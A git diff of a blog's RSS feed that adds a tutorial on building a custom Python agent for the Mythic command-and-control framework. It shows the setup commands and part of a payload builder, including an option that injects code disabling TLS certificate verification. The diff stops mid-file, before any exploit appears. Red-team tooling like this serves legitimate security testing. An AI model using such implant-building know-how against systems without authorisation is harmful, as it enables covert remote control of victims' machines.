@@ -6,8 +6,605 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Wed, 01 Apr 2026 10:38:53 +0100</lastBuildDate>
+        <lastBuildDate>Wed, 08 Apr 2026 11:09:02 +0100</lastBuildDate>
         <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Building a Custom Mythic Agent from Scratch (in Python)</title>
+            <link>/posts/mythic_agent/</link>
+            <pubDate>Wed, 08 Apr 2026 11:09:02 +0100</pubDate>
+            
+            <guid>/posts/mythic_agent/</guid>
+            <description>This is the continuation of this article
+## Introduction
+Now that we have a working Mythic setup, we&amp;rsquo;re able to deep diver into C2 architecture and start integrating our own tools and techniques to the base platform.
+The goal is simple:
+Understand how an agent really works internally Build my own minimal implant Extend it with a custom command tied to a real-world privilege escalation exploit Integrate everything cleanly into Mythic’s tasking system Understanding the Agent Model To get started, we have example containers available to help us understand the file structures.</description>
+            <content type="html"><![CDATA[<blockquote>
+<p>This is the continuation of <a href="yassine-elhammoumi.github.io/posts/install_mythic/">this article</a></p>
+</blockquote>
+<p>## Introduction</p>
+<p>Now that we have a working Mythic setup, we&rsquo;re able to deep diver into C2 architecture and start integrating our own tools and techniques to the base platform.</p>
+<p>The goal is simple:</p>
+<ul>
+<li>Understand how an agent really works internally</li>
+<li>Build my own minimal implant</li>
+<li>Extend it with a custom command tied to a real-world privilege escalation exploit</li>
+<li>Integrate everything cleanly into Mythic’s tasking system</li>
+</ul>
+<h2 id="understanding-the-agent-model">Understanding the Agent Model</h2>
+<p>To get started, we have <a href="https://github.com/MythicMeta/ExampleContainers">example containers</a> available to help us understand the file structures. You can read the docs to understand it better. But to make this post shorter, I&rsquo;ll give a high level explanation of everything I did.</p>
+<h3 id="stripping-down-the-example-containers">Stripping down the Example Containers</h3>
+<p>Inside the cloned repo. There are python and Go services, I&rsquo;ll use python to define my project, so we can remove the Go services. Inside the python services, there are multiple directories, we&rsquo;ll only be needing the <code>basic_python_agent</code>, the rest we can get rid of.</p>
+<p>Here&rsquo;s an overview of what my directory looked like up to this point :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Plaintext" data-lang="Plaintext"><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>├── basic_python_agent
+</span></span><span style="display:flex;"><span>│   ├── agent_code
+</span></span><span style="display:flex;"><span>│   │   ├── base
+</span></span><span style="display:flex;"><span>│   │   │   └── apfell-jxa.js
+</span></span><span style="display:flex;"><span>│   │   ├── c2_profiles
+</span></span><span style="display:flex;"><span>│   │   │   ├── dynamichttp.js
+</span></span><span style="display:flex;"><span>│   │   │   └── http.js
+</span></span><span style="display:flex;"><span>│   │   ├── download.js
+</span></span><span style="display:flex;"><span>│   │   ├── exit.js
+</span></span><span style="display:flex;"><span>│   │   ├── list_apps.js
+</span></span><span style="display:flex;"><span>│   │   ├── list_entitlements.js
+</span></span><span style="display:flex;"><span>│   │   ├── ls.js
+</span></span><span style="display:flex;"><span>│   │   ├── shell.js
+</span></span><span style="display:flex;"><span>│   │   └── upload.js
+</span></span><span style="display:flex;"><span>│   ├── agent_functions
+</span></span><span style="display:flex;"><span>│   │   ├── basic_python_agent.svg
+</span></span><span style="display:flex;"><span>│   │   ├── builder.py
+</span></span><span style="display:flex;"><span>│   │   ├── download.py
+</span></span><span style="display:flex;"><span>│   │   ├── exit.py
+</span></span><span style="display:flex;"><span>│   │   ├── __init__.py
+</span></span><span style="display:flex;"><span>│   │   ├── list_apps.py
+</span></span><span style="display:flex;"><span>│   │   ├── list_entitlements.py
+</span></span><span style="display:flex;"><span>│   │   ├── ls.py
+</span></span><span style="display:flex;"><span>│   │   ├── shell.py
+</span></span><span style="display:flex;"><span>│   │   └── upload.py
+</span></span><span style="display:flex;"><span>│   ├── browser_scripts
+</span></span><span style="display:flex;"><span>│   │   ├── download_new.js
+</span></span><span style="display:flex;"><span>│   │   ├── list_apps_new.js
+</span></span><span style="display:flex;"><span>│   │   ├── list_entitlements_new.js
+</span></span><span style="display:flex;"><span>│   │   └── ls_new.js
+</span></span><span style="display:flex;"><span>│   └── __init__.py
+</span></span><span style="display:flex;"><span>├── Dockerfile
+</span></span><span style="display:flex;"><span>├── __init__.py
+</span></span><span style="display:flex;"><span>├── main.py
+</span></span><span style="display:flex;"><span>└── rabbitmq_config.json
+</span></span></code></pre></div><p>Now, we&rsquo;re able to test things out by copying our <code>basic_python_agent</code> Directory inside the <code>InstalledServices</code> Directory inside our Mythic folder hierarchy (refer to <a href="yassine-elhammoumi.github.io/posts/install_mythic/">this</a> if you don&rsquo;t know what I&rsquo;m talking about).</p>
+<p>We need to add service and build it :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cp -R basic/agent/directory installed/services/directory
+</span></span><span style="display:flex;"><span>sudo ./mythic-cli add python_services
+</span></span><span style="display:flex;"><span>sudo ./mythic-cli build python_services
+</span></span></code></pre></div>
+    <img src="/mythic/first_step/first_build.png"  alt="Building our first service"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>We can see that everything worked as it was supposed to by checking the UI.</p>
+
+    <img src="/mythic/first_step/online.png"  alt="Checking that the agent is online"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p><em>note : Make sure to remove the uninstalled services from <code>main.py</code> and use <code>sudo ./mythic-cli logs basic_python_agent</code> to troubleshoot</em></p>
+
+    <img src="/mythic/first_step/unused.png"  alt="Making sure unused services are commented out"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<h3 id="customizing-our-agent">Customizing Our Agent</h3>
+<p>The file that uses as a reference for building your agent is the <code>builder.py</code> inside the <code>agent_functions</code> directory.</p>
+<p>You&rsquo;ll need to change the name, file extension, supported OS and basically everything inside your agent class to fit your need. On my end, I wanted to use python to build my payload and support both Linux and Windows. I ended up with the following file :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> mythic_container.PayloadBuilder <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> mythic_container.MythicCommandBase <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> mythic_container.MythicRPC <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> asyncio<span style="color:#f92672">,</span> pathlib<span style="color:#f92672">,</span> os<span style="color:#f92672">,</span> tempfile<span style="color:#f92672">,</span> base64<span style="color:#f92672">,</span> hashlib<span style="color:#f92672">,</span> json<span style="color:#f92672">,</span> re
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> itertools <span style="color:#f92672">import</span> cycle
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">WeeAgent</span>(PayloadType):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;WeeAgent&#34;</span>
+</span></span><span style="display:flex;"><span>    file_extension <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;py&#34;</span>
+</span></span><span style="display:flex;"><span>    author <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;@Yassine-elhammoumi&#34;</span>
+</span></span><span style="display:flex;"><span>    supported_os <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>        SupportedOS<span style="color:#f92672">.</span>Linux, SupportedOS<span style="color:#f92672">.</span>Windows 
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>    wrapper <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>    wrapped_payloads <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    mythic_encrypts <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    note <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Test Agent for a Linux and Windows&#34;</span>
+</span></span><span style="display:flex;"><span>    supports_dynamic_loading <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    c2_profiles <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;http&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    build_parameters <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>        BuildParameter(
+</span></span><span style="display:flex;"><span>            name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;output&#34;</span>,
+</span></span><span style="display:flex;"><span>            parameter_type<span style="color:#f92672">=</span>BuildParameterType<span style="color:#f92672">.</span>ChooseOne,
+</span></span><span style="display:flex;"><span>            description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Choose output format&#34;</span>,
+</span></span><span style="display:flex;"><span>            choices<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;py&#34;</span>, <span style="color:#e6db74">&#34;base64&#34;</span>],
+</span></span><span style="display:flex;"><span>            default_value<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;py&#34;</span>
+</span></span><span style="display:flex;"><span>        ),
+</span></span><span style="display:flex;"><span>        BuildParameter(
+</span></span><span style="display:flex;"><span>            name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;python_version&#34;</span>,
+</span></span><span style="display:flex;"><span>            parameter_type<span style="color:#f92672">=</span>BuildParameterType<span style="color:#f92672">.</span>ChooseOne,
+</span></span><span style="display:flex;"><span>            description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Choose Python version&#34;</span>,
+</span></span><span style="display:flex;"><span>            choices<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;Python 3.8&#34;</span>, <span style="color:#e6db74">&#34;Python 2.7&#34;</span>],
+</span></span><span style="display:flex;"><span>            default_value<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Python 3.8&#34;</span>
+</span></span><span style="display:flex;"><span>        ),
+</span></span><span style="display:flex;"><span>        BuildParameter(
+</span></span><span style="display:flex;"><span>            name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https_check&#34;</span>,
+</span></span><span style="display:flex;"><span>            parameter_type<span style="color:#f92672">=</span>BuildParameterType<span style="color:#f92672">.</span>ChooseOne,
+</span></span><span style="display:flex;"><span>            description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Verify HTTPS certificate (if HTTP, leave yes)&#34;</span>,
+</span></span><span style="display:flex;"><span>            choices<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;Yes&#34;</span>, <span style="color:#e6db74">&#34;No&#34;</span>],
+</span></span><span style="display:flex;"><span>            default_value<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Yes&#34;</span>
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    agent_path <span style="color:#f92672">=</span> pathlib<span style="color:#f92672">.</span>Path(<span style="color:#e6db74">&#34;.&#34;</span>) <span style="color:#f92672">/</span> <span style="color:#e6db74">&#34;weeagent&#34;</span> <span style="color:#f92672">/</span> <span style="color:#e6db74">&#34;mythic&#34;</span>
+</span></span><span style="display:flex;"><span>    agent_icon_path <span style="color:#f92672">=</span> agent_path <span style="color:#f92672">/</span> <span style="color:#e6db74">&#34;weeagent.svg&#34;</span>
+</span></span><span style="display:flex;"><span>    agent_code_path <span style="color:#f92672">=</span> pathlib<span style="color:#f92672">.</span>Path(<span style="color:#e6db74">&#34;.&#34;</span>) <span style="color:#f92672">/</span> <span style="color:#e6db74">&#34;weeagent&#34;</span> <span style="color:#f92672">/</span> <span style="color:#e6db74">&#34;agent_code&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    build_steps <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>        BuildStep(step_name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Gathering Files&#34;</span>, step_description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Creating script payload&#34;</span>)
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    translation_container <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getPythonVersionFile</span>(self, directory, file):
+</span></span><span style="display:flex;"><span>        pyv <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>get_parameter(<span style="color:#e6db74">&#34;python_version&#34;</span>)
+</span></span><span style="display:flex;"><span>        filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(directory, <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">.py&#34;</span><span style="color:#f92672">.</span>format(file))):
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">#while we&#39;ve specified a python version, this function is agnostic so just return the .py</span>
+</span></span><span style="display:flex;"><span>            filename <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(directory, <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">.py&#34;</span><span style="color:#f92672">.</span>format(file))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> pyv <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;Python 2.7&#34;</span>:
+</span></span><span style="display:flex;"><span>            filename <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(directory, <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">.py2&#34;</span><span style="color:#f92672">.</span>format(file))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> pyv <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;Python 3.8&#34;</span>:
+</span></span><span style="display:flex;"><span>            filename <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(directory, <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">.py3&#34;</span><span style="color:#f92672">.</span>format(file))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(filename) <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> filename:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> filename
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_read_file</span>(self, path: str) <span style="color:#f92672">-&gt;</span> str:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(path, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_apply_https_setting</span>(self, base_code: str, profile_name: str) <span style="color:#f92672">-&gt;</span> str:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>get_parameter(<span style="color:#e6db74">&#34;https_check&#34;</span>) <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;No&#34;</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> base_code<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;#CERTSKIP&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> base_code<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;urlopen(req)&#34;</span>, <span style="color:#e6db74">&#34;urlopen(req, context=gcontext)&#34;</span>)<span style="color:#f92672">.</span>replace(
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;#CERTSKIP&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        gcontext = ssl.create_default_context()
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        gcontext.check_hostname = False
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        gcontext.verify_mode = ssl.CERT_NONE</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_parse_transport_template</span>(self, template_code: str) <span style="color:#f92672">-&gt;</span> dict:
+</span></span><span style="display:flex;"><span>        parts <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>split(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;###\s*(IMPORTS|CLASS_FIELDS|FUNCTIONS|CONFIG)\s*###&#34;</span>, template_code)
+</span></span><span style="display:flex;"><span>        sections <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;IMPORTS&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;CLASS_FIELDS&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;FUNCTIONS&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;CONFIG&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>}
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, len(parts), <span style="color:#ae81ff">2</span>):
+</span></span><span style="display:flex;"><span>            section_name <span style="color:#f92672">=</span> parts[i]<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>            section_value <span style="color:#f92672">=</span> parts[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>            sections[section_name] <span style="color:#f92672">=</span> section_value<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> sections
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_validate_transport_template_format</span>(self, profile_name: str, template_code: str):
+</span></span><span style="display:flex;"><span>        required <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;IMPORTS&#34;</span>, <span style="color:#e6db74">&#34;CLASS_FIELDS&#34;</span>, <span style="color:#e6db74">&#34;FUNCTIONS&#34;</span>, <span style="color:#e6db74">&#34;CONFIG&#34;</span>]
+</span></span><span style="display:flex;"><span>        markers <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;###\s*(IMPORTS|CLASS_FIELDS|FUNCTIONS|CONFIG)\s*###&#34;</span>, template_code)
+</span></span><span style="display:flex;"><span>        missing <span style="color:#f92672">=</span> [m <span style="color:#66d9ef">for</span> m <span style="color:#f92672">in</span> required <span style="color:#66d9ef">if</span> markers<span style="color:#f92672">.</span>count(m) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>        duplicates <span style="color:#f92672">=</span> [m <span style="color:#66d9ef">for</span> m <span style="color:#f92672">in</span> required <span style="color:#66d9ef">if</span> markers<span style="color:#f92672">.</span>count(m) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> missing <span style="color:#f92672">or</span> duplicates:
+</span></span><span style="display:flex;"><span>            details <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> missing:
+</span></span><span style="display:flex;"><span>                details<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#34;missing markers: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(<span style="color:#e6db74">&#34;, &#34;</span><span style="color:#f92672">.</span>join(missing)))
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> duplicates:
+</span></span><span style="display:flex;"><span>                details<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#34;duplicate markers: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(<span style="color:#e6db74">&#34;, &#34;</span><span style="color:#f92672">.</span>join(duplicates)))
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;Transport template transport_</span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> has invalid section markers (</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">)&#34;</span><span style="color:#f92672">.</span>format(
+</span></span><span style="display:flex;"><span>                    profile_name,
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;; &#34;</span><span style="color:#f92672">.</span>join(details)
+</span></span><span style="display:flex;"><span>                )
+</span></span><span style="display:flex;"><span>            )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_validate_transport_sections</span>(self, profile_name: str, sections: dict):
+</span></span><span style="display:flex;"><span>        required_non_empty <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;FUNCTIONS&#34;</span>, <span style="color:#e6db74">&#34;CONFIG&#34;</span>]
+</span></span><span style="display:flex;"><span>        missing <span style="color:#f92672">=</span> [s <span style="color:#66d9ef">for</span> s <span style="color:#f92672">in</span> required_non_empty <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> sections<span style="color:#f92672">.</span>get(s, <span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">.</span>strip()]
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> missing:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;Transport template transport_</span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> is missing required non-empty sections: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(
+</span></span><span style="display:flex;"><span>                    profile_name,
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;, &#34;</span><span style="color:#f92672">.</span>join(missing)
+</span></span><span style="display:flex;"><span>                )
+</span></span><span style="display:flex;"><span>            )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_validate_core_markers_replaced</span>(self, base_code: str, profile_name: str):
+</span></span><span style="display:flex;"><span>        unresolved <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>            marker <span style="color:#66d9ef">for</span> marker <span style="color:#f92672">in</span> [
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;TRANSPORT_IMPORTS&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;TRANSPORT_CLASS_FIELDS&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;TRANSPORT_FUNCTIONS&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;TRANSPORT_CONFIG&#34;</span>,
+</span></span><span style="display:flex;"><span>            ]
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> marker <span style="color:#f92672">in</span> base_code
+</span></span><span style="display:flex;"><span>        ]
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> unresolved:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;Core template marker replacement failed for transport_</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">; unresolved markers: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(
+</span></span><span style="display:flex;"><span>                    profile_name,
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;, &#34;</span><span style="color:#f92672">.</span>join(unresolved)
+</span></span><span style="display:flex;"><span>                )
+</span></span><span style="display:flex;"><span>            )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_get_base_code_for_profile</span>(self, profile_name: str) <span style="color:#f92672">-&gt;</span> str:
+</span></span><span style="display:flex;"><span>        base_path <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>getPythonVersionFile(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(self<span style="color:#f92672">.</span>agent_code_path, <span style="color:#e6db74">&#34;base_agent&#34;</span>), <span style="color:#e6db74">&#34;base_agent_core&#34;</span>)
+</span></span><span style="display:flex;"><span>        transport_path <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>getPythonVersionFile(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(self<span style="color:#f92672">.</span>agent_code_path, <span style="color:#e6db74">&#34;base_agent&#34;</span>), <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;transport_</span><span style="color:#e6db74">{</span>profile_name<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> base_path:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(<span style="color:#e6db74">&#34;Missing base_agent_core template for selected python version&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> transport_path:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(<span style="color:#e6db74">&#34;Missing transport template for profile </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> and selected python version&#34;</span><span style="color:#f92672">.</span>format(profile_name))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        base_code <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_read_file(base_path)
+</span></span><span style="display:flex;"><span>        transport_template <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_read_file(transport_path)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>_validate_transport_template_format(profile_name, transport_template)
+</span></span><span style="display:flex;"><span>        transport_sections <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_parse_transport_template(transport_template)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>_validate_transport_sections(profile_name, transport_sections)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        base_code <span style="color:#f92672">=</span> base_code<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;TRANSPORT_IMPORTS&#34;</span>, transport_sections[<span style="color:#e6db74">&#34;IMPORTS&#34;</span>])
+</span></span><span style="display:flex;"><span>        base_code <span style="color:#f92672">=</span> base_code<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;TRANSPORT_CLASS_FIELDS&#34;</span>, transport_sections[<span style="color:#e6db74">&#34;CLASS_FIELDS&#34;</span>])
+</span></span><span style="display:flex;"><span>        base_code <span style="color:#f92672">=</span> base_code<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;TRANSPORT_FUNCTIONS&#34;</span>, transport_sections[<span style="color:#e6db74">&#34;FUNCTIONS&#34;</span>])
+</span></span><span style="display:flex;"><span>        base_code <span style="color:#f92672">=</span> base_code<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;TRANSPORT_CONFIG&#34;</span>, transport_sections[<span style="color:#e6db74">&#34;CONFIG&#34;</span>])
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>_validate_core_markers_replaced(base_code, profile_name)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> base_code
